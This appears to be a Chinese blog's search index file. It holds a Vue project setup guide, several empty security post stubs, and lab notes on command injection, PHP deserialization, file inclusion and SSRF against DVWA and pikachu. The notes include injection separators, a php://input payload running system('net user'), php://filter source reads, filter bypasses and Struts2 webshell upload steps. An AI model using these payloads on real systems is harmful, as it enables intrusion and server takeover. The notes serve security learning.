<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vue搭建</title>
      <link href="2020/09/15/vue%E6%90%AD%E5%BB%BA/"/>
      <url>2020/09/15/vue%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="1-避坑前言"><a href="#1-避坑前言" class="headerlink" title="1. 避坑前言"></a>1. 避坑前言</h4><p>确认node与npm的版本</p><p>将这个放在最前面说是希望大家在搭建前，应该先确保将node更新至6以上，这样能少走一些弯路。下面开始正式介绍整个构建过程。</p><h4 id="2-使用-vue-cli-搭建项目"><a href="#2-使用-vue-cli-搭建项目" class="headerlink" title="2. 使用 vue-cli 搭建项目"></a>2. 使用 vue-cli 搭建项目</h4><p>下面整个过程是基于已经安装node.js和cnpm的基础上，node.js如何安装就不在这里详说了。如何全局化安装cnpm，这里简单提一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install cnpm -g --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>其实对于安装vue-cli，使用npm命令和cnpm命令都是可以的，个人觉得使用npm安装的比较慢，而且很可能会因为网络问题而出错，所以还是觉得使用cnpm稳一点。</p><h6 id="（1）全局安装-vue-cli-，在命令提示窗口执行："><a href="#（1）全局安装-vue-cli-，在命令提示窗口执行：" class="headerlink" title="（1）全局安装 vue-cli ，在命令提示窗口执行："></a>（1）全局安装 vue-cli ，在命令提示窗口执行：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g vue-cli </span><br></pre></td></tr></table></figure><p>安装vue-cli</p><p>出现以上提示表示vue-cli正常安装成功，可以正式创建vue-cli工程项目了。</p><h6 id="（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令："><a href="#（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令：" class="headerlink" title="（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令："></a>（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack</span><br></pre></td></tr></table></figure><p>创建vue-cli工程项目</p><p>确认创建项目后，后续还需输入一下项目名称、项目描述、作者、打包方式、是否使用ESLint规范代码等等，</p><p>生成文件目录</p><h6 id="（3）生成文件目录后，使用-cnpm-安装依赖："><a href="#（3）生成文件目录后，使用-cnpm-安装依赖：" class="headerlink" title="（3）生成文件目录后，使用 cnpm 安装依赖："></a>（3）生成文件目录后，使用 cnpm 安装依赖：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install </span><br></pre></td></tr></table></figure><p>安装依赖</p><h6 id="（4）最后需要执行命令：-npm-run-dev-来启动项目，启动完成后会自动弹出默认网页："><a href="#（4）最后需要执行命令：-npm-run-dev-来启动项目，启动完成后会自动弹出默认网页：" class="headerlink" title="（4）最后需要执行命令： npm run dev  来启动项目，启动完成后会自动弹出默认网页："></a>（4）最后需要执行命令： npm run dev  来启动项目，启动完成后会自动弹出默认网页：</h6><p>到这一步，就算成功利用vue-cli搭建一个vue项目了，撒花 ~</p><h4 id="3-目录结构及其对应作用"><a href="#3-目录结构及其对应作用" class="headerlink" title="3.目录结构及其对应作用"></a>3.目录结构及其对应作用</h4><p>通过vue-cli搭建一个vue项目，会自动生成一系列文件，而这些文件具体是怎样的结构、文件对应起什么作用，可以看看下面的解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">├── build&#x2F;                      # webpack 编译任务配置文件: 开发环境与生产环境</span><br><span class="line">│   └── ...</span><br><span class="line">├── config&#x2F;                     </span><br><span class="line">│   ├── index.js                # 项目核心配置</span><br><span class="line">│   └── ...</span><br><span class="line">├ ── node_module&#x2F;               #项目中安装的依赖模块</span><br><span class="line">   ── src&#x2F;</span><br><span class="line">│   ├── main.js                 # 程序入口文件</span><br><span class="line">│   ├── App.vue                 # 程序入口vue组件</span><br><span class="line">│   ├── components&#x2F;             # 组件</span><br><span class="line">│   │   └── ...</span><br><span class="line">│   └── assets&#x2F;                 # 资源文件夹，一般放一些静态资源文件</span><br><span class="line">│       └── ...</span><br><span class="line">├── static&#x2F;                     # 纯静态资源 (直接拷贝到dist&#x2F;static&#x2F;里面)</span><br><span class="line">├── test&#x2F;</span><br><span class="line">│   └── unit&#x2F;                   # 单元测试</span><br><span class="line">│   │   ├── specs&#x2F;              # 测试规范</span><br><span class="line">│   │   ├── index.js            # 测试入口文件</span><br><span class="line">│   │   └── karma.conf.js       # 测试运行配置文件</span><br><span class="line">│   └── e2e&#x2F;                    # 端到端测试</span><br><span class="line">│   │   ├── specs&#x2F;              # 测试规范</span><br><span class="line">│   │   ├── custom-assertions&#x2F;  # 端到端测试自定义断言</span><br><span class="line">│   │   ├── runner.js           # 运行测试的脚本</span><br><span class="line">│   │   └── nightwatch.conf.js  # 运行测试的配置文件</span><br><span class="line">├── .babelrc                    # babel 配置文件</span><br><span class="line">├── .editorconfig               # 编辑配置文件</span><br><span class="line">├── .gitignore                  # 用来过滤一些版本控制的文件，比如node_modules文件夹 </span><br><span class="line">├── index.html                  # index.html 入口模板文件</span><br><span class="line">└── package.json                # 项目文件，记载着一些命令和依赖还有简要的项目描述信息 </span><br><span class="line">└── README.md                   #介绍自己这个项目的，可参照github上star多的项目。</span><br><span class="line">build&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>越权、逻辑漏洞</title>
      <link href="2020/09/12/%E8%B6%8A%E6%9D%83%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/09/12/%E8%B6%8A%E6%9D%83%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>脚本后门分析</title>
      <link href="2020/09/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
      <url>2020/09/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解</title>
      <link href="2020/09/12/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>2020/09/12/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>中间人攻击</title>
      <link href="2020/09/12/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>2020/09/12/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>waf绕过</title>
      <link href="2020/09/12/waf%E7%BB%95%E8%BF%87/"/>
      <url>2020/09/12/waf%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>社工、APT</title>
      <link href="2020/09/12/%E7%A4%BE%E5%B7%A5%E3%80%81APT/"/>
      <url>2020/09/12/%E7%A4%BE%E5%B7%A5%E3%80%81APT/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>旁注、目录越权、跨库、CDN绕过</title>
      <link href="2020/09/12/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/"/>
      <url>2020/09/12/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>编辑器漏洞</title>
      <link href="2020/09/12/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/09/12/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="2020/09/12/XXE/"/>
      <url>2020/09/12/XXE/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>代码执行与反序列化</title>
      <link href="2020/09/12/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2020/09/12/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png"></p><h2 id="远程命令"><a href="#远程命令" class="headerlink" title="远程命令"></a>远程命令</h2><p><strong>执行原理</strong>：应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</p><p>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h2 id="远程代码"><a href="#远程代码" class="headerlink" title="远程代码"></a>远程代码</h2><p><strong>执行漏洞原理</strong>：为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p><p>​      因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><h2 id="php执行系统及代码命令常用函数"><a href="#php执行系统及代码命令常用函数" class="headerlink" title="php执行系统及代码命令常用函数"></a>php执行系统及代码命令常用函数</h2><p>1）<strong>执行系统命令:</strong></p><p>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号）</p><p><a href="https://links.jianshu.com/go?to=http://www.2cto.com/kf/web/php/">PHP</a>执行<a href="https://links.jianshu.com/go?to=http://www.2cto.com/os/">系统</a>命令的有几个常用的函数,如有:system函数、exec函数、popen函数,passthru,shell_exec函数他们都可以执行系统命令,不过前提时必须系统给了权限了哦。</p><p><strong>system</strong>函数</p><p>说明：执行外部程序并显示输出资料。</p><p>语法：string system(string command, int</p><p>[return_var]);</p><p>返回值: 字符串详细介绍：本函数就像是 C 语中的函数 system(),用来执行指令,并输出结果,若是 return_var 参数存在,则执行 command 之后的状态会填入 return_var 中,同样值得注意的是若需要处理用户输入的资料,而又要防止用户耍花招<a href="https://links.jianshu.com/go?to=http://www.2cto.com/article/jiami/">破解</a>系统,则可以使用 EscapeShellCmd(),若 PHP 以模块式的执行,本函数会在每一行输出后自动更新 Web 服务器的输出缓冲暂存区,若需要完整的返回字符串,且不想经过不必要的其它中间的输出界面,可以使用 PassThru()。</p><p> <strong>exec</strong>函数</p><p>说明：执行外部程序。</p><p>语法：string exec(string command,</p><p>string [array], int [return_var]);</p><p>返回值: 字符串</p><p>详细介绍：本函数执行输入 command 的外部程序或外部指令。它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用PassThru() 这个函数。</p><p>要是参数 array 存在，command 会将 array 加到参数中执行，若不欲 array 被处理，可以在执行 exec() 之前呼叫 unset()。若是 return_var 跟 array 二个参数都存在，则执行 command 之后的状态会填入 return_var 中。</p><p>值得注意的是若需要处理使用者输入的资料，而又要防止使用者耍花招破解系统，则可以使用EscapeShellCmd()</p><p><strong>popen</strong>函数</p><p>说明：打开文件。</p><p>语法：int popen(string command, string</p><p>mode);</p><p>返回值: 整数</p><p>详细介绍：本函数执行指令开档，而该文件是用管道方式处理的文件。用本函数打开的文件只能是单向的(只能读或只能写)，而且一定要用pclose() 关闭。在文件操作上可使用 fgets()、fgetss() 与 fputs()。若是开档发生错误，返回 false 值。</p><p><strong>反撇号</strong>`（和~在同一个键）执行系统外部命令,</p><p>代码如下:echo</p><p><code>dir</code>;</p><p>知识点：在使用这种方法执行系统外部命令时，你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。</p><p><strong>安全性说明</strong>:当你使用这些函数执行命令时，如果是根据用户提交数据作为执行命令的话，你需要考虑<a href="https://links.jianshu.com/go?to=http://www.2cto.com/article/xitong/">系统安全</a>性，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。</p><h2 id="完成dvwa三个级别实验"><a href="#完成dvwa三个级别实验" class="headerlink" title="完成dvwa三个级别实验"></a>完成dvwa三个级别实验</h2><p><strong>Low级别</strong></p><p>当dvwa级别为low时可以看源代码没做过滤</p><p>我们便可以通过加&amp;&amp;、；、|、等符号入侵（当有&amp;&amp;时前面ip必须为真‘否则后面的命令不会执行当自有&amp;时前面ip为假那么命令便会在web存在的服务器执行）</p><p>我们便可以通过127.0.0.1&amp;&amp;ipconfig（各种命令）来执行命令</p><p><strong>Medium级别</strong></p><p>当在medium级别时我们可以看源代码将&amp;&amp;、；、过滤了</p><p>这时我们可以使用添加&amp;加空格或&amp;;&amp;    进行入侵</p><p><strong>High级别</strong></p><p>在high级别时我们可以看到源代码对以下做了过滤</p><p>此时我们可以添加|| （代码里面的|后有一个空格）进行入侵</p><p><strong>Impossible级别</strong>的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p><h2 id="struts2-048、045、052、057实验"><a href="#struts2-048、045、052、057实验" class="headerlink" title="struts2 048、045、052、057实验"></a>struts2 048、045、052、057实验</h2><p>参考文章：</p><p><a href="https://blog.csdn.net/weixin_43625577/article/details/97111575">https://blog.csdn.net/weixin_43625577/article/details/97111575</a></p><p><a href="https://www.sinesafe.com/article/20180823/struts2057.html">https://www.sinesafe.com/article/20180823/struts2057.html</a></p><h4 id="Struts2-045实验"><a href="#Struts2-045实验" class="headerlink" title="Struts2 045实验"></a>Struts2 045实验</h4><p>使用k8工具</p><p>执行添加账号命令</p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt="img"></p><p>上传木马小马</p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" alt="img"></p><p>链接小马上传大马</p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg" alt="img"></p><h4 id="Struts2-048实验"><a href="#Struts2-048实验" class="headerlink" title="Struts2 048实验"></a>Struts2 048实验</h4><p>使用方法struts2_S2-048.py <url>  <cmd></p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.jpg" alt="img"></p><h4 id="Struts2-052实验"><a href="#Struts2-052实验" class="headerlink" title="Struts2 052实验"></a>Struts2 052实验</h4><p>参考<a href="https://www.cnblogs.com/Hi-blog/p/7510987.html">https://www.cnblogs.com/Hi-blog/p/7510987.html</a></p><p>针对版本Ubuntu 16.04 、Apache/2.4.18、Struts2.5 –</p><p>Struts2.5.12版本。：struts2-rest-showcase因为我的版本无漏洞就先把操作过程如下</p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" alt="img"></p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.jpg" alt="img"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>就是把一个对象变成可以传输的字符串，目的就是为了方便传输。假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。</p><p><strong>详细参考</strong>：</p><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>serialize()和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p><p>当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</p><h4 id="完成反序列化pikachu实试"><a href="#完成反序列化pikachu实试" class="headerlink" title="完成反序列化pikachu实试"></a>完成反序列化pikachu实试</h4><p>在线反序列化工具：<a href="https://links.jianshu.com/go?to=https://www.w3cschool.cn/tools/index?name=unserialize">https://www.w3cschool.cn/tools/index?name=unserialize</a></p><p>输入payload：O:1:”S”:1:{s:4:”test”;s:29:”alert(‘xss’)”;}</p><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="2020/09/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>2020/09/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png"></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>使用include文件</p><p>代码表示上传的文件都以php执行</p><p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg" alt="img"></p><p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.jpg" alt="img"></p><h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>需要把allow_url_include=on，magic_quotes_gpc=off</p><h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>      当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。            Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中</p><p>开启apache日志方法打开配置文件-httpd-conf，打开httpd.conf配置文件，</p><p>第299行：</p><p>\1.    ##CustomLog “logs/access.log” common</p><p>去掉前边的 # ，并<strong>重启apache</strong>。</p><p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.PNG" alt="img"></p><p>写入一句话木马</p><h1 id="PHP包含写文件"><a href="#PHP包含写文件" class="headerlink" title="PHP包含写文件"></a>PHP包含写文件</h1><p>构造URL:</p><p><a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input</a>,</p><p>并且提交post数据为:</p><?php system('net user');?><p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.jpg" alt="img"></p><p>​     注意:只有在allow _url_include为on的时候才可以使用,如果想查看回显结果那必须在C:\php\php-5.2.14-Win32下找到php-apache2handler.ini打开，查找display_funtions=proc-open,oppen,exec,system…….删掉system重启apache。</p><h1 id="PHP包含读文件"><a href="#PHP包含读文件" class="headerlink" title="PHP包含读文件"></a>PHP包含读文件</h1><p><a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p><p>访问URL,得到经过base64加密后的字符串:</p><p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.jpg"></p><p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.jpg"></p><h1 id="包含截断绕过"><a href="#包含截断绕过" class="headerlink" title="包含截断绕过"></a>包含截断绕过</h1><?php​         if(isset($_GET['page'])){​                  include$_GET['page'] .".php" ;​         }else{​                  include'home.php';​         }?><p>   这种方法只适合于magic_quotes_gpc=off的时候， php版本小于5.3.4，可通过%00截断绕过，不过现在已经很难见到了，比如：index.php?file=info.txt//////////////…………超过一定数据的/。</p><h1 id="str-replace、fnmatch涵数绕过"><a href="#str-replace、fnmatch涵数绕过" class="headerlink" title="str_replace、fnmatch涵数绕过"></a>str_replace、fnmatch涵数绕过</h1><h3 id="str-replace函数绕过"><a href="#str-replace函数绕过" class="headerlink" title="str_replace函数绕过:"></a>str_replace函数绕过:</h3><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</p><p>例如page=ht<a href="http://tp//192.168.0.103/phpinfo.txt%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E4%BC%9A%E5%B0%86http://%E5%88%A0%E9%99%A4%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://192.168.0.103/phpinfo.txt%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82">http://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。</a></p><p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>1、本地文件包含</p><p> <a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=..././777.jpg">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=…/./777.jpg</a></p><p>2、绝对路径不受任何影响<a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt</a></p><p>3、远程文件包含:<a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php</a></p><h3 id="fnmatch函数绕过"><a href="#fnmatch函数绕过" class="headerlink" title="fnmatch函数绕过"></a>fnmatch函数绕过</h3><p>if(!fnmatch(“file*”,$file)&amp;&amp;$file!=”include.php”),当文件既不是”include.php”也不是”file*”（文件名file开头）时才抛出错误，反之意思，如果文件名符合其中一个条件既可以。page=file:///C:/xampp/htdocs/dvwa/php.ini 刚好满足”file*”（文件名file开头）。</p><p> <a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt</a></p><h2 id="php内置协议"><a href="#php内置协议" class="headerlink" title="php内置协议"></a>php内置协议</h2><table><thead><tr><th>File://</th><th>访问本地文件系统</th></tr></thead><tbody><tr><td>htt[p://</td><td>访问HTTP(s)网址</td></tr><tr><td>ftp://</td><td>访问FTP(s)URLS</td></tr><tr><td>php://</td><td>访问各个输入/输出流(I/o streams)</td></tr><tr><td>zlib://</td><td>压缩流</td></tr><tr><td>data://</td><td>数据(RFC2397)</td></tr><tr><td>ssh2://</td><td>Secure Shell 2</td></tr><tr><td>expect://</td><td>处理交互式的流</td></tr><tr><td>glob://</td><td>查找匹配的文件路径模式</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF服务端请求伪造</title>
      <link href="2020/09/12/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>2020/09/12/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0.png"></p><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>      服务器端请求伪造：是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，ssrf是要目标网站的内部系统，因为他是从内部系统访问的，所有可能通过它攻击外网无法访问的内部系统，也就是说把目标网站当中间人</p><h2 id="形成原因："><a href="#形成原因：" class="headerlink" title="形成原因："></a>形成原因：</h2><p>       大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制</p><p>       比如从指定url获取网页文本内容，加载指定网站的图片，文档等</p><h2 id="漏洞的挖掘："><a href="#漏洞的挖掘：" class="headerlink" title="漏洞的挖掘："></a>漏洞的挖掘：</h2><h3 id="1、通过web功能寻找"><a href="#1、通过web功能寻找" class="headerlink" title="1、通过web功能寻找"></a>1、通过web功能寻找</h3><p>1）分享：通过URL地址分享网页内容</p><p>2）转码服务</p><p>3）在线翻译</p><p>4）图片加载与下载：通过URL地址加载或下载图片</p><p>5）图片、文章收藏功能</p><p>6）未公开的api实现以及其他调用URL的功能</p><h3 id="2、通过url关键字寻找share"><a href="#2、通过url关键字寻找share" class="headerlink" title="2、通过url关键字寻找share"></a>2、通过url关键字寻找share</h3><ul><li>wap</li><li>url</li><li>link</li><li>src</li><li>source</li><li>target</li><li>u</li><li>3g</li><li>display</li><li>sourceURl</li><li>imageURL</li><li>domain</li></ul><h3 id="3、通过扫描器工具寻找"><a href="#3、通过扫描器工具寻找" class="headerlink" title="3、通过扫描器工具寻找"></a>3、通过扫描器工具寻找</h3><h2 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h2><ol><li><p>更改ip地址写法：转换进制</p></li><li><p>利用解析url出现的问题</p><p><a 